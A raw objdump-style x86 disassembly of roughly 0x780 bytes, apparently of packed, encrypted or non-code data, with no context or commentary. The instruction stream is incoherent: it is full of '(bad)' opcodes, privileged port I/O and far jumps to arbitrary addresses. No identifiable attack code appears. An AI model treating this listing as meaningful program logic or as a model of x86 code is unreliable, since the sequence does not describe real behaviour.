  40e357:	es fnsave ss:[ebp-0x2c45c1d0]
  40e35f:	xor    esi,DWORD PTR [ecx+0x236f4aba]
  40e365:	xlat   BYTE PTR ds:[ebx]
  40e366:	nop
  40e367:	pop    ebp
  40e368:	idiv   ebx
  40e36a:	sub    ch,ch
  40e36c:	retf   0xa0e1
  40e36f:	shr    BYTE PTR [ecx-0x71],cl
  40e372:	push   0x3
  40e374:	or     al,0x53
  40e376:	add    BYTE PTR [eax+0x5d],0xe
  40e37a:	or     ebp,ebx
  40e37c:	adc    BYTE PTR [esi+0x4b],ch
  40e37f:	inc    ebx
  40e380:	xlat   BYTE PTR ds:[ebx]
  40e381:	ins    DWORD PTR es:[edi],dx
  40e382:	mov    ebp,0x8df573d1
  40e387:	jl     0x40e3f3
  40e389:	jmp    0x222f9f40
  40e38e:	xor    edx,ecx
  40e390:	xor    eax,0xb1f082e4
  40e395:	retf   0x5a7d
  40e398:	jae    0x40e3f0
  40e39a:	mov    ds:0xb45e70d4,al
  40e39f:	fsubr  st(6),st
  40e3a1:	sbb    ah,BYTE PTR [edx+0x31bbdf6f]
  40e3a7:	adc    al,0x2c
  40e3a9:	std    
  40e3aa:	out    0x56,eax
  40e3ac:	add    DWORD PTR [eax],ebp
  40e3ae:	rcr    DWORD PTR [edx+esi*1-0x682f66d],0x8c
  40e3b6:	in     al,0x22
  40e3b8:	push   es
  40e3b9:	(bad)  
  40e3ba:	jns    0x40e391
  40e3bc:	push   ebp
  40e3bd:	lds    esp,FWORD PTR [edx]
  40e3bf:	sbb    eax,0x51547315
  40e3c4:	mov    esi,0x25de337f
  40e3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3ca:	stos   BYTE PTR es:[edi],al
  40e3cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3cc:	inc    ecx
  40e3cd:	jl     0x40e42f
  40e3cf:	imul   esi,esp,0xffffff86
  40e3d2:	mov    edi,0x7348fbae
  40e3d7:	xchg   DWORD PTR [eax-0x4717c6fd],ecx
  40e3dd:	inc    ebx
  40e3de:	pop    eax
  40e3df:	pshufw mm5,QWORD PTR [eax-0x58808ab7],0x61
  40e3e7:	mov    ds:0xee7faf17,al
  40e3ec:	(bad)  
  40e3ed:	scas   al,BYTE PTR es:[edi]
  40e3ee:	retf   0xaaf1
  40e3f1:	(bad)  [bp+di-0x27]
  40e3f5:	add    DWORD PTR [eax+0x1bb3520d],esi
  40e3fb:	jle    0x40e408
  40e3fd:	js     0x40e3e2
  40e3ff:	cdq    
  40e400:	scas   al,BYTE PTR es:[edi]
  40e401:	ret    
  40e402:	dec    esp
  40e403:	push   ebp
  40e404:	pop    esi
  40e405:	daa    
  40e406:	pop    esi
  40e407:	xor    DWORD PTR [eax],ecx
  40e409:	ror    BYTE PTR [eax],1
  40e40b:	pop    es
  40e40c:	xchg   edx,eax
  40e40d:	(bad)  
  40e40e:	xor    dh,BYTE PTR [esi-0x185b0f94]
  40e414:	bound  esi,QWORD PTR [edx]
  40e416:	mov    cl,0x48
  40e418:	test   eax,0x88876d76
  40e41d:	in     al,0x3b
  40e41f:	stc    
  40e420:	xlat   BYTE PTR ds:[ebx]
  40e421:	out    0x89,eax
  40e423:	out    dx,al
  40e424:	sbb    BYTE PTR [ebx-0x3ead6c22],ah
  40e42a:	cmp    DWORD PTR [ebx-0x38],ebx
  40e42d:	fwait
  40e42e:	idiv   ah
  40e430:	test   al,0x20
  40e432:	cmp    al,0xe6
  40e434:	xor    esp,esi
  40e436:	mov    WORD PTR [edx-0x80],cs
  40e439:	xor    al,0x26
  40e43b:	jo     0x40e415
  40e43d:	lock dec edi
  40e43f:	dec    ebp
  40e440:	loopne 0x40e4c1
  40e442:	sub    DWORD PTR cs:[ebx*1+0x4678aa86],ebx
  40e44a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e44b:	jmp    0x40e43d
  40e44d:	adc    dh,ch
  40e44f:	xchg   ebp,eax
  40e450:	jb     0x40e3dc
  40e452:	dec    edi
  40e453:	btc    DWORD PTR [esi-0x1a775eaf],edi
  40e45a:	xchg   BYTE PTR [edi-0x16],ch
  40e45d:	jne    0x40e406
  40e45f:	lahf   
  40e460:	je     0x40e4b4
  40e462:	(bad)  
  40e464:	iret   
  40e465:	out    0x2,al
  40e467:	sub    eax,DWORD PTR [ecx+0x44]
  40e46a:	xchg   edx,eax
  40e46b:	mov    ah,ch
  40e46d:	ror    esi,0x7b
  40e470:	cli    
  40e471:	sub    edx,DWORD PTR [eax]
  40e473:	sub    BYTE PTR [edx+ebx*8-0x4ea6243],cl
  40e47a:	pushf  
  40e47b:	not    DWORD PTR [eax]
  40e47d:	loope  0x40e43b
  40e47f:	add    al,0x4e
  40e481:	mov    ds:0x8471c73a,eax
  40e486:	sub    ecx,ecx
  40e488:	mov    dh,0x95
  40e48a:	adc    ecx,ebp
  40e48c:	add    bl,BYTE PTR [esi+0x509592b]
  40e492:	and    DWORD PTR [ebx],0x2ca75333
  40e498:	xchg   edx,eax
  40e499:	test   al,0x43
  40e49b:	pop    edx
  40e49c:	fs inc esp
  40e49e:	test   al,0xc6
  40e4a0:	in     al,dx
  40e4a1:	inc    BYTE PTR [esi+0x1846d647]
  40e4a7:	enter  0x8fa5,0xb6
  40e4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ac:	ins    BYTE PTR es:[edi],dx
  40e4ad:	pop    ecx
  40e4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4af:	and    ah,BYTE PTR [edx+0x761ea8e1]
  40e4b5:	xchg   edx,eax
  40e4b6:	clc    
  40e4b7:	xor    edi,ebx
  40e4b9:	push   ebx
  40e4ba:	push   ebx
  40e4bb:	(bad)  [ecx+ebx*2+0x65]
  40e4bf:	leave  
  40e4c0:	jbe    0x40e4f9
  40e4c2:	dec    ecx
  40e4c3:	xchg   edx,eax
  40e4c4:	enter  0x8e98,0x94
  40e4c8:	mov    esi,0x232ca40f
  40e4cd:	jmp    0x4ba4:0x897d2741
  40e4d4:	loope  0x40e480
  40e4d6:	sti    
  40e4d7:	or     DWORD PTR [ecx-0x22952588],0x20604c7b
  40e4e1:	cmp    eax,0x6240df2d
  40e4e6:	outs   dx,BYTE PTR ds:[esi]
  40e4e7:	test   DWORD PTR [ecx+0x49],ebx
  40e4ea:	or     eax,0xc3e12a6b
  40e4ef:	lahf   
  40e4f0:	dec    esp
  40e4f1:	push   eax
  40e4f2:	and    BYTE PTR [eax],0xb1
  40e4f5:	add    eax,0xce70bf03
  40e4fa:	vmaxps ymm7,ymm7,YMMWORD PTR [ebp-0x6c]
  40e4ff:	imul   DWORD PTR [ebp+0x4cd9dc82]
  40e505:	or     al,0xf3
  40e507:	mov    dl,0xf2
  40e509:	pop    esi
  40e50a:	push   es
  40e50b:	ss aas 
  40e50d:	call   0x47e8:0xa172afd0
  40e514:	push   es
  40e515:	mov    al,0x2
  40e517:	add    DWORD PTR [ecx-0x19],ebx
  40e51a:	ror    DWORD PTR [eax],cl
  40e51c:	xchg   edi,eax
  40e51d:	jnp    0x40e567
  40e51f:	add    esp,DWORD PTR [eax-0x15d8d97d]
  40e525:	pop    ds
  40e526:	ds out dx,al
  40e528:	lods   al,BYTE PTR ds:[esi]
  40e529:	(bad)  
  40e52a:	push   esp
  40e52b:	xor    eax,0xbfc3cf4c
  40e530:	jmp    0x40e523
  40e532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e533:	jns    0x40e57a
  40e535:	inc    esp
  40e536:	loop   0x40e513
  40e538:	aaa    
  40e539:	add    eax,0xd64b175f
  40e53e:	lahf   
  40e53f:	inc    eax
  40e540:	adc    BYTE PTR [eax-0x4075bfb1],dh
  40e546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e547:	int    0x8d
  40e549:	call   0x7f0ac05b
  40e54e:	loope  0x40e517
  40e550:	fidivr WORD PTR [esi+0x1a]
  40e553:	and    bh,BYTE PTR [ebp-0x2e]
  40e556:	pop    ds
  40e557:	and    al,BYTE PTR [ebx+0x57]
  40e55a:	sbb    eax,0x2b30324e
  40e55f:	jmp    0xdb843ef4
  40e564:	jle    0x40e52d
  40e566:	out    dx,al
  40e567:	gs mov ah,0x4f
  40e56a:	mov    bh,0x7b
  40e56c:	fstp   TBYTE PTR [edx-0x2ba44712]
  40e572:	xchg   ebp,eax
  40e573:	retf   0x2aed
  40e576:	xor    esi,DWORD PTR [ebx-0xaa075a0]
  40e57c:	mov    DWORD PTR [edi+0x46],ebx
  40e57f:	lods   al,BYTE PTR ds:[esi]
  40e580:	mov    eax,cs
  40e582:	out    dx,eax
  40e583:	mov    cl,0xe4
  40e585:	cmp    edi,edi
  40e587:	cmp    edi,ebp
  40e589:	outs   dx,BYTE PTR ds:[esi]
  40e58a:	inc    edi
  40e58b:	sub    al,0x4a
  40e58d:	mov    esp,0xe52143d3
  40e592:	add    DWORD PTR [edi-0x10eae6b3],esp
  40e598:	out    dx,al
  40e599:	shr    BYTE PTR [esi+0x63f6370c],0xcb
  40e5a0:	or     eax,0x4a96b481
  40e5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5a6:	inc    edi
  40e5a7:	dec    edx
  40e5a8:	dec    eax
  40e5a9:	add    eax,0x6a608325
  40e5ae:	jns    0x40e588
  40e5b0:	cmp    ch,BYTE PTR [ecx-0x72]
  40e5b3:	adc    eax,0xf28067dd
  40e5b8:	inc    ebx
  40e5b9:	mov    ds:0x50692dbc,al
  40e5be:	iret   
  40e5bf:	cmp    al,0x2c
  40e5c1:	cmp    ch,BYTE PTR [ecx+0x59]
  40e5c4:	xchg   edi,eax
  40e5c5:	pop    esi
  40e5c6:	ins    DWORD PTR es:[edi],dx
  40e5c7:	push   ds
  40e5c8:	mov    ebx,0x35684614
  40e5cd:	fdivrp st(5),st
  40e5cf:	push   cs
  40e5d0:	repz sbb esi,edi
  40e5d3:	out    dx,eax
  40e5d4:	sti    
  40e5d5:	ja     0x40e616
  40e5d7:	jecxz  0x40e58c
  40e5d9:	dec    edx
  40e5da:	sti    
  40e5db:	lahf   
  40e5dc:	xor    al,0xd6
  40e5de:	cmp    BYTE PTR [eax-0x5a],ah
  40e5e1:	add    BYTE PTR [ecx+edi*8],ah
  40e5e4:	mov    bh,0x0
  40e5e6:	das    
  40e5e7:	inc    ecx
  40e5e8:	mov    al,0x45
  40e5ea:	mov    ebx,0x623b4c43
  40e5ef:	out    0x4d,eax
  40e5f1:	pop    ebx
  40e5f2:	sub    DWORD PTR [eax],ecx
  40e5f4:	out    dx,eax
  40e5f5:	add    al,0x17
  40e5f7:	out    dx,al
  40e5f8:	xchg   esi,eax
  40e5f9:	mov    ebp,0xa03d8dd4
  40e5fe:	mov    edi,0xdbe1a807
  40e603:	ins    BYTE PTR es:[edi],dx
  40e604:	out    dx,eax
  40e605:	xlat   BYTE PTR ds:[ebx]
  40e606:	shl    BYTE PTR [edx+ebp*2-0xe],cl
  40e60a:	cmp    eax,esp
  40e60c:	nop
  40e60d:	dec    esp
  40e60e:	(bad)  [edx]
  40e610:	int3   
  40e611:	xor    DWORD PTR [ecx+ebp*2],esi
  40e614:	mov    dl,0xab
  40e616:	jb     0x40e5a1
  40e618:	adc    BYTE PTR [esi-0x322da927],dl
  40e61e:	dec    ebx
  40e61f:	or     al,0xf8
  40e621:	mov    edx,edi
  40e623:	test   eax,0xe188b9cd
  40e628:	std    
  40e629:	aad    0x7e
  40e62b:	call   0x1ab1:0x6d4a98e3
  40e632:	mov    eax,0xbb7bfe56
  40e637:	cmp    esp,ebx
  40e639:	xchg   ebp,eax
  40e63a:	lahf   
  40e63b:	fsubr  QWORD PTR [edx-0x52]
  40e63e:	pop    ss
  40e63f:	mov    ds:0x904d4198,eax
  40e644:	mov    WORD PTR [ecx],cs
  40e646:	pop    esp
  40e647:	sahf   
  40e648:	inc    esp
  40e649:	xor    dh,BYTE PTR [eax]
  40e64b:	add    al,BYTE PTR [edi+esi*1+0x51662fb]
  40e652:	aaa    
  40e653:	mov    edi,0x6e08c97e
  40e658:	and    eax,0x3b15723a
  40e65d:	shr    DWORD PTR [edi+0x4e457313],cl
  40e663:	arpl   WORD PTR [esi-0x56],ax
  40e666:	lahf   
  40e667:	ja     0x40e5f5
  40e669:	das    
  40e66a:	cmp    ebx,DWORD PTR [eax-0x70]
  40e66d:	mov    DWORD PTR [ebx+0x5c],eax
  40e670:	sub    eax,0x9ecf4ebc
  40e675:	fs in  al,0xbe
  40e678:	sti    
  40e679:	loop   0x40e69a
  40e67b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e67c:	sub    al,bh
  40e67e:	sbb    BYTE PTR cs:[ebx-0x23c8b9ae],ah
  40e685:	mov    ebp,0x46c6e21e
  40e68a:	fxch   st(6)
  40e68c:	jp     0x40e6ea
  40e68e:	dec    esp
  40e68f:	xchg   ecx,eax
  40e690:	ja     0x40e68b
  40e692:	mov    dh,0xa3
  40e694:	mov    ebx,0xdca276af
  40e699:	dec    ebp
  40e69a:	aaa    
  40e69b:	addr16 adc esi,ebx
  40e69e:	jecxz  0x40e6e2
  40e6a0:	aad    0x54
  40e6a2:	test   BYTE PTR [esi+0x2c],cl
  40e6a5:	lock les esp,FWORD PTR ds:0x877e801e
  40e6ac:	les    ecx,FWORD PTR [esi+0x4ab3a4cf]
  40e6b2:	dec    ebx
  40e6b3:	sub    eax,0xfae1eef5
  40e6b8:	mov    ebx,0x2ab977e2
  40e6bd:	mov    DWORD PTR [ebp+0x25],edx
  40e6c0:	and    al,0xbd
  40e6c2:	jmp    0xcbc88d45
  40e6c7:	dec    ebx
  40e6c8:	cld    
  40e6c9:	or     BYTE PTR [eax-0x58],bh
  40e6cc:	(bad)  
  40e6cd:	jg     0x40e667
  40e6cf:	cmp    ebx,edi
  40e6d1:	mov    edx,0x519b7bf0
  40e6d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d7:	sbb    ch,bh
  40e6d9:	lds    esi,FWORD PTR [esi+0x613fa60]
  40e6df:	mov    ch,bl
  40e6e1:	sub    al,0x82
  40e6e3:	addr16 test ecx,0xf37ad8c2
  40e6ea:	jg     0x40e703
  40e6ec:	mov    ebx,0x20976986
  40e6f1:	pop    eax
  40e6f2:	mov    ebx,0xa5ca398e
  40e6f7:	aas    
  40e6f8:	mov    ebx,0x63f692de
  40e6fd:	sub    BYTE PTR [esi+0x7b],bh
  40e700:	popa   
  40e701:	enter  0xecac,0x2c
  40e705:	stos   BYTE PTR es:[edi],al
  40e706:	push   cs
  40e707:	daa    
  40e708:	mov    esp,0x7e4bb3d8
  40e70d:	jb     0x40e761
  40e70f:	cmp    ecx,DWORD PTR [esi-0x3de2e322]
  40e715:	neg    BYTE PTR [ebx+0x4f]
  40e718:	je     0x40e71c
  40e71a:	jb     0x40e6cc
  40e71c:	sbb    al,BYTE PTR [edi+0x25be15bc]
  40e722:	clc    
  40e723:	clc    
  40e724:	jb     0x40e6b4
  40e726:	pop    eax
  40e727:	xchg   ebp,eax
  40e728:	les    esi,FWORD PTR [eiz*4+0x44a49470]
  40e72f:	cmp    BYTE PTR [ebp-0x5c],0xf9
  40e733:	xchg   esp,esp
  40e735:	(bad)  
  40e736:	adc    BYTE PTR [ebp+0x19],cl
  40e739:	inc    esp
  40e73a:	sbb    al,0x1
  40e73c:	repz ja 0x40e751
  40e73f:	test   al,0xac
  40e741:	and    bl,ah
  40e743:	in     al,dx
  40e744:	sbb    al,0xce
  40e746:	pop    ds
  40e747:	pusha  
  40e748:	and    ecx,DWORD PTR [ebp+0x625ca111]
  40e74e:	iret   
  40e74f:	cmp    cl,BYTE PTR [esi]
  40e751:	lea    ebx,[ebp-0x27]
  40e754:	adc    DWORD PTR [edx-0x38f94ce9],0x38975238
  40e75e:	or     eax,0x2df932af
  40e763:	imul   edi,DWORD PTR [edi+0x49],0x73d081cf
  40e76a:	in     al,dx
  40e76b:	sbb    BYTE PTR [ebx+0x7b],bh
  40e76e:	jbe    0x40e7a2
  40e770:	imul   ebx,DWORD PTR [ecx-0x771d4d03],0xffffffe3
  40e777:	(bad)  
  40e778:	xchg   DWORD PTR [ebx-0xfc99c75],esp
  40e77e:	mov    bl,0xdc
  40e780:	je     0x40e7f3
  40e782:	shl    bh,cl
  40e784:	or     eax,0x1654ebc0
  40e789:	imul   DWORD PTR [ecx+0x3a]
  40e78c:	xchg   edi,eax
  40e78d:	aas    
  40e78e:	pop    ds
  40e78f:	mov    ds:0x32b5c218,al
  40e794:	imul   ebx,DWORD PTR ds:0x118961c3,0xffffffca
  40e79b:	data16 xlat BYTE PTR ss:[ebx]
  40e79e:	dec    edx
  40e79f:	int    0x8d
  40e7a1:	push   esp
  40e7a2:	dec    esi
  40e7a3:	jb     0x40e7b3
  40e7a5:	xor    dh,dl
  40e7a7:	mov    ch,0xc9
  40e7a9:	test   BYTE PTR [esi+ecx*4-0x31a1a58f],ch
  40e7b0:	or     BYTE PTR [edx+0x5f82236e],cl
  40e7b6:	xchg   esi,eax
  40e7b7:	pop    esi
  40e7b8:	sbb    BYTE PTR [eax+0x2bf076db],ah
  40e7be:	outs   dx,DWORD PTR ds:[esi]
  40e7bf:	lods   al,BYTE PTR ds:[esi]
  40e7c0:	lock mov ah,BYTE PTR [ebx]
  40e7c3:	ds xchg edx,eax
  40e7c5:	mov    dl,0x46
  40e7c7:	test   BYTE PTR gs:[edi-0xc43777e],bl
  40e7ce:	add    eax,0x94768d20
  40e7d3:	(bad)  
  40e7d4:	inc    eax
  40e7d5:	retf   
  40e7d6:	jno    0x40e7be
  40e7d8:	inc    esp
  40e7d9:	xor    DWORD PTR [eax-0x5a],0x10f35198
  40e7e0:	xor    DWORD PTR [edx+0x54],ebx
  40e7e3:	push   ds
  40e7e4:	pop    esi
  40e7e5:	xor    BYTE PTR [esp+ecx*1],0x37
  40e7e9:	adc    al,0x97
  40e7eb:	popf   
  40e7ec:	ret    
  40e7ed:	sbb    DWORD PTR [eax+eax*8],ecx
  40e7f0:	and    ebp,DWORD PTR [ebp-0x323f774]
  40e7f6:	fdiv   QWORD PTR [ecx+0x49]
  40e7f9:	call   0xa43182ee
  40e7fe:	imul   eax,DWORD PTR [ecx+0x26c781af],0x65
  40e805:	add    eax,0xdb200fd5
  40e80a:	xchg   ebx,ebp
  40e80c:	or     DWORD PTR [edi+0x37],0x400270d2
  40e813:	ret    
  40e814:	fwait
  40e815:	xor    DWORD PTR [ebx],edi
  40e817:	sub    BYTE PTR [edx+edi*8-0x15cfa17e],al
  40e81e:	addr16 mov ah,0xd
  40e821:	popa   
  40e822:	fsubrp st(0),st
  40e824:	popa   
  40e825:	mov    dl,0xa3
  40e827:	or     al,0xbd
  40e829:	mov    ecx,0x83b0bc30
  40e82e:	stos   DWORD PTR es:[edi],eax
  40e82f:	lahf   
  40e830:	and    ch,BYTE PTR [edx+0x41]
  40e833:	and    ch,BYTE PTR [edi]
  40e835:	sbb    DWORD PTR [edi+0x48],edx
  40e838:	(bad)  
  40e839:	mov    al,ds:0x58f63ea4
  40e83e:	aas    
  40e83f:	shl    ah,0xe1
  40e842:	mov    dh,0x52
  40e844:	or     ebp,DWORD PTR [ebx+0x20]
  40e847:	out    0x5b,eax
  40e849:	or     DWORD PTR [ebp+0x37],0xdf812a92
  40e850:	cmc    
  40e851:	in     al,0xb1
  40e853:	out    dx,eax
  40e854:	scas   eax,DWORD PTR es:[edi]
  40e855:	neg    DWORD PTR [edx-0x74]
  40e858:	outs   dx,DWORD PTR ds:[esi]
  40e859:	cmp    bl,BYTE PTR [edx-0x6d8887b1]
  40e85f:	sbb    ah,al
  40e861:	(bad)  
  40e862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e863:	inc    edi
  40e864:	jmp    0x40e84c
  40e866:	push   ds
  40e867:	test   al,0xb2
  40e86a:	(bad)  
  40e86b:	add    al,0x71
  40e86d:	inc    ecx
  40e86e:	in     al,dx
  40e86f:	loop   0x40e83a
  40e871:	jecxz  0x40e88b
  40e873:	stos   DWORD PTR es:[edi],eax
  40e874:	pop    esi
  40e875:	popa   
  40e876:	push   edi
  40e877:	adc    eax,DWORD PTR [ecx-0xbc165da]
  40e87d:	pop    edi
  40e87e:	cmp    al,0x32
  40e880:	cmp    BYTE PTR [eax+0x6e],cl
  40e883:	jae    0x40e86b
  40e885:	rol    DWORD PTR [edi+0x43],0xa6
  40e889:	pop    edx
  40e88a:	cmp    eax,0xb081c90f
  40e88f:	pop    ecx
  40e890:	nop
  40e891:	enter  0x8d86,0x52
  40e895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e896:	jnp    0x40e8e1
  40e898:	sbb    edi,eax
  40e89a:	out    0x2e,al
  40e89c:	inc    esp
  40e89d:	add    DWORD PTR [edx-0xc6e313],ecx
  40e8a3:	or     ecx,DWORD PTR [ebx+0x6252f5f3]
  40e8a9:	inc    edi
  40e8aa:	sub    al,0x22
  40e8ac:	dec    eax
  40e8ad:	adc    eax,DWORD PTR [eax-0x745f1ee2]
  40e8b3:	popf   
  40e8b4:	jno    0x40e888
  40e8b6:	sbb    BYTE PTR [edi+0x7fda3401],ch
  40e8bc:	adc    BYTE PTR [ebx],bh
  40e8be:	pop    es
  40e8bf:	push   esp
  40e8c0:	imul   esp,DWORD PTR [ecx+0x5e],0xf4b83301
  40e8c7:	mov    edx,0xc6ea43b9
  40e8cc:	loopne 0x40e84f
  40e8ce:	or     eax,0xf3da5174
  40e8d3:	or     al,0x25
  40e8d5:	call   0xbdc2:0xe8d365f1
  40e8dc:	xlat   BYTE PTR ds:[ebx]
  40e8dd:	sbb    esi,DWORD PTR ds:0x84cbaae7
  40e8e3:	lea    esi,es:[edi]
  40e8e6:	inc    ebx
  40e8e7:	lds    esp,FWORD PTR [ecx]
  40e8e9:	jp     0x40e888
  40e8eb:	mov    ah,0x9d
  40e8ed:	jmp    0x38c2e9dd
  40e8f2:	(bad)  
  40e8f3:	adc    BYTE PTR ds:0x9194c427,bh
  40e8f9:	sub    edx,eax
  40e8fb:	sahf   
  40e8fc:	pop    esi
  40e8fd:	sti    
  40e8fe:	push   ss
  40e8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e900:	out    0xc9,al
  40e902:	retf   0x581c
  40e905:	mov    ecx,0xcf756809
  40e90a:	dec    edx
  40e90b:	loop   0x40e955
  40e90d:	mov    eax,ds:0x835489fc
  40e912:	sub    eax,0x60382489
  40e917:	xor    ebp,DWORD PTR [edx+0x56d50d94]
  40e91d:	test   edi,esp
  40e91f:	or     al,0xf3
  40e921:	push   ebp
  40e922:	sbb    eax,0xee47aaa2
  40e927:	pop    ds
  40e928:	jp     0x40e8c1
  40e92a:	cmp    al,0xcd
  40e92c:	(bad)  
  40e92d:	adc    eax,0xe549b58c
  40e932:	inc    ebp
  40e933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e934:	inc    esp
  40e935:	sbb    bh,BYTE PTR [esi+ebx*2+0x22]
  40e939:	xchg   edx,eax
  40e93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e93b:	push   ecx
  40e93c:	pusha  
  40e93d:	jl     0x40e99f
  40e93f:	in     al,0x0
  40e941:	inc    ecx
  40e942:	mov    BYTE PTR [esi+edx*4+0x363f21cc],0x8c
  40e94a:	fs sub eax,0x307b476a
  40e950:	mov    ah,0xbe
  40e952:	sub    DWORD PTR ds:0xdbb1da61,ebx
  40e958:	inc    ebx
  40e959:	icebp  
  40e95a:	out    0x24,eax
  40e95c:	lods   al,BYTE PTR ds:[esi]
  40e95d:	adc    al,0x4e
  40e95f:	ss (bad) 
  40e961:	jae    0x40e9a9
  40e963:	aaa    
  40e964:	jo     0x40e997
  40e966:	mov    bh,0x2f
  40e968:	xor    al,0xe7
  40e96a:	jns    0x40e97e
  40e96c:	out    0x6a,al
  40e96e:	mov    bh,0xf0
  40e970:	and    DWORD PTR [edi-0x3d],ecx
  40e973:	scas   al,BYTE PTR es:[edi]
  40e974:	xchg   edi,eax
  40e975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e976:	loope  0x40e99e
  40e978:	dec    ebx
  40e979:	(bad)  
  40e97a:	adc    DWORD PTR [ebx],ecx
  40e97c:	repnz adc ecx,DWORD PTR [eax-0x46243322]
  40e983:	cmp    al,0x42
  40e985:	sbb    esi,edi
  40e987:	loope  0x40e99a
  40e989:	push   0xd0f6050d
  40e98e:	(bad)  
  40e98f:	sti    
  40e990:	push   esi
  40e991:	xchg   esi,eax
  40e992:	lock add DWORD PTR [ecx-0x4f],ebx
  40e996:	arpl   WORD PTR [edi-0x46a98a60],si
  40e99c:	out    0x42,eax
  40e99e:	mov    edi,0x25705d7
  40e9a3:	dec    ecx
  40e9a4:	in     al,0x43
  40e9a6:	pop    esi
  40e9a7:	in     al,0xd5
  40e9a9:	fwait
  40e9aa:	pop    edx
  40e9ab:	es mov esi,0x66f144b0
  40e9b1:	mov    ?,WORD PTR [eax]
  40e9b3:	ficom  DWORD PTR ds:0x327e1021
  40e9b9:	out    0x6c,eax
  40e9bb:	mov    ecx,gs
  40e9bd:	push   es
  40e9be:	mov    bl,0x4e
  40e9c0:	fdivr  QWORD PTR [ebx-0x24d0629c]
  40e9c6:	mov    ds:0xaaf6cdae,eax
  40e9cb:	out    0xf3,eax
  40e9cd:	call   0x673858a2
  40e9d2:	fidivr DWORD PTR [edi-0x794dbbf4]
  40e9d8:	out    dx,eax
  40e9d9:	cmp    BYTE PTR [esi],bl
  40e9db:	jnp    0x40e99d
  40e9dd:	ins    BYTE PTR es:[edi],dx
  40e9de:	adc    DWORD PTR [edx],edx
  40e9e0:	sub    BYTE PTR [edx],al
  40e9e2:	mov    edi,0x29af1bae
  40e9e7:	and    eax,0x61aa9037
  40e9ec:	jns    0x40ea00
  40e9ee:	enter  0x29c0,0xa5
  40e9f2:	inc    esi
  40e9f3:	call   0x89ba:0x1816c013
  40e9fa:	ins    BYTE PTR es:[edi],dx
  40e9fb:	daa    
  40e9fc:	loop   0x40ea39
  40e9fe:	adc    cl,BYTE PTR [edx]
  40ea00:	inc    eax
  40ea01:	xchg   bl,dh
  40ea03:	gs out dx,al
  40ea05:	ss cwde 
  40ea07:	xchg   edi,eax
  40ea08:	bound  ebp,QWORD PTR [edi+0x43]
  40ea0b:	xor    edi,DWORD PTR [ecx-0x7f58e5e2]
  40ea11:	sub    DWORD PTR [eax+0x15],edi
  40ea14:	icebp  
  40ea15:	mov    ebp,0x765446e1
  40ea1a:	test   eax,0x547bd1f
  40ea1f:	sahf   
  40ea20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea21:	(bad)  
  40ea22:	js     0x40ea5f
  40ea24:	fwait
  40ea25:	inc    edi
  40ea26:	inc    ebx
  40ea27:	mov    ebx,0x2fdcbcbd
  40ea2c:	js     0x40ea99
  40ea2e:	stos   DWORD PTR es:[edi],eax
  40ea2f:	mov    dh,0x76
  40ea31:	xchg   ebx,eax
  40ea32:	pop    esp
  40ea33:	xlat   BYTE PTR ds:[ebx]
  40ea34:	inc    ebx
  40ea35:	adc    al,0x7d
  40ea37:	adc    bh,dh
  40ea39:	or     al,dl
  40ea3b:	adc    dl,BYTE PTR [edx+0x6b016a30]
  40ea41:	xchg   esi,eax
  40ea42:	push   cs
  40ea43:	leave  
  40ea44:	mov    eax,ds:0xd831bc1a
  40ea49:	mov    WORD PTR [edi],fs
  40ea4b:	pop    ecx
  40ea4c:	push   ebp
  40ea4d:	push   es
  40ea4e:	jecxz  0x40e9f7
  40ea50:	hlt    
  40ea51:	pop    ebp
  40ea52:	push   ds
  40ea53:	inc    esp
  40ea54:	test   al,0x35
  40ea56:	not    bh
  40ea58:	mov    esp,0xd21bd963
  40ea5d:	call   0xf5b1:0x2d7442ad
  40ea64:	ror    BYTE PTR [esi-0x62],cl
  40ea67:	mov    al,0x6a
  40ea69:	sub    DWORD PTR [eax-0x6d8dcce4],ecx
  40ea6f:	mov    fs,WORD PTR ds:0x39d0b0a5
  40ea75:	mov    ch,0x9b
  40ea77:	popf   
  40ea78:	int    0xf
  40ea7a:	push   eax
  40ea7b:	dec    esp
  40ea7c:	fstp   DWORD PTR [ebx+0x48]
  40ea7f:	mov    ebx,0xc6a3a4e9
  40ea84:	cmp    eax,0xf821d58e
  40ea89:	cmp    ebx,ebx
  40ea8b:	int    0x4c
  40ea8d:	cmp    eax,DWORD PTR [esi+0x2af2b8af]
  40ea93:	xchg   edx,eax
  40ea94:	out    dx,al
  40ea95:	out    dx,al
  40ea96:	sbb    BYTE PTR [eax-0x2bb9de8a],al
  40ea9c:	es dec ebp
  40ea9e:	add    eax,0x469d9b2c
  40eaa3:	bound  esp,QWORD PTR [edi+0x2d]
  40eaa6:	fsubp  st(1),st
  40eaa8:	cs (bad) 
  40eaaa:	pop    ss
  40eaab:	xchg   edi,eax
  40eaac:	bound  edi,QWORD PTR [ebp+0x2ea836e]
  40eab2:	(bad)  
  40eab3:	jae    0x40eb2d
  40eab5:	sub    eax,0xc70046c1
  40eaba:	fcom   QWORD PTR [ecx-0x56389204]
  40eac0:	inc    ebp
  40eac1:	jmp    0x1d8f30a3
  40eac6:	inc    edi
  40eac7:	pop    eax
  40eac8:	mov    dl,0x87
  40eaca:	out    dx,eax
  40eacb:	fisub  WORD PTR [edx]
  40eacd:	mov    dh,0x1c
  40eacf:	xor    BYTE PTR [edx-0x18],bl
  40ead2:	jp     0x40ea83
  40ead4:	cmp    esi,ebx
  40ead6:	dec    esp
  40ead7:	mov    dl,BYTE PTR [ebp-0x4b8cb1af]
  40eadd:	jne    0x40ea97
